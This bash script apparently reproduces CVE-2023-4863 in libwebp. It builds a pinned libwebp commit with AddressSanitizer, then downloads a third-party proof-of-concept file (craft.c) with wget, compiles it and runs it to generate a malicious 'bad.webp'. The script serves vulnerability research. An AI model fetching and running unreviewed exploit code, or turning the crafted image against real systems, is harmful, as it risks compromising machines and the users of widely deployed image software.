#!/bin/bash

sudo apt install libjpeg-dev libpng-dev libtiff-dev libgif-dev gcc make git -y

git clone https://chromium.googlesource.com/webm/libwebp/ webp_test
pushd webp_test/
git checkout 7ba44f80f3b94fc0138db159afea770ef06532a0
# enable AddressSanitizer
sed -i 's/^EXTRA_FLAGS=.*/& -fsanitize=address/' makefile.unix
# build webp
make -f makefile.unix
pushd examples/
# fetch mistymntncop's proof-of-concept code
wget https://raw.githubusercontent.com/mistymntncop/CVE-2023-4863/main/craft.c
# build and run proof-of-concept
gcc -o craft craft.c
./craft bad.webp
